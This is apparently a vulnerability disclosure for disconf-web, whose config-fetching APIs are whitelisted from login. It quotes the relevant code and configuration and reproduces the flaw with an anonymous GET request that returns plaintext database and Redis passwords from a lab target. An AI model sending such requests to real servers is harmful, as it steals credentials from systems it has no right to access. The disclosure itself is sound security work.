# disconf Unauthenticated Config API (Configuration / Credential Disclosure)

## Introduction to Vulnerabilities

The config-fetching APIs `/api/config/item`, `/api/config/file`, `/api/config/list` and `/api/config/simple/list` of the open-source distributed configuration center **disconf** (Baidu) are exposed without authentication. The `LoginInterceptor` explicitly whitelists these four paths, so any anonymous attacker can read every configuration item and configuration file managed by the config center — in production this holds plaintext database passwords, Redis passwords, API keys and other secrets.

## Affected Versions

disconf-master `disconf-web` (deployed on Tomcat 8.5.100, JDK 8, context path `/disconf`)

## Utilize conditions

- Target reachable at `http://127.0.0.1:8088/disconf`
- No authentication required (anonymous)

## Vulnerability Reproduction

**Source (user input point)** — `app` / `env` / `version` / `key` from the query string:

```java
// disconf-web/src/main/java/com/baidu/disconf/web/web/config/controller/ConfigFetcherController.java
@NoAuth  @RequestMapping(value = "/list")         // GET config list
@NoAuth  @RequestMapping(value = "/simple/list")  // GET config simple list
@NoAuth  @RequestMapping(value = "/item")         // GET config item
@NoAuth  @RequestMapping(value = "/file")         // GET config file (content)
```

![image-20260815200954206](https://github.com/fangtang7/picx-images-hosting/raw/master/disconf/image-20260815200954206.5moj87eane.webp)

**Sink** — `LoginInterceptor` explicitly skips login check for these four paths:

```java
// disconf-web/src/main/resources/myconfig/spring-servlet-interceptor.xml
LoginInterceptor.notInterceptPathList:
    /api/config/item
    /api/config/file
    /api/config/list
    /api/config/simple/list
```

![image-20260815201200777](https://github.com/fangtang7/picx-images-hosting/raw/master/disconf/image-20260815201200777.6f1epxvh0p.webp)

Anonymous pull of the full config list (all values in plaintext):

```
GET /disconf/api/config/list?app=disconf_demo&env=rd&version=1_0_0_0 HTTP/1.1
Host: 127.0.0.1:8088
```

```
HTTP/1.1 200
{"success":"true","page":{"result":[{"name":"jdbc.password","value":"ProdDb@2026#P@ssw0rd",...},
{"name":"redis.password","value":"Red1s@Prod2026",...},
{"name":"jdbc.properties","value":"jdbc.url=...\njdbc.password=ProdDb@2026#P@ssw0rd",...},
...],"totalCount":19}}
```

![image-20260815201433376](https://github.com/fangtang7/picx-images-hosting/raw/master/disconf/image-20260815201433376.3uvkdaw0bu.webp)

## Impact

Any anonymous attacker can:

1. read the value of every configuration item — database passwords and Redis passwords in plaintext,
2. download the full content of every configuration file (jdbc connection strings with username/password, properties / xml / json),
3. pull the entire configuration list with plaintext values in one request.

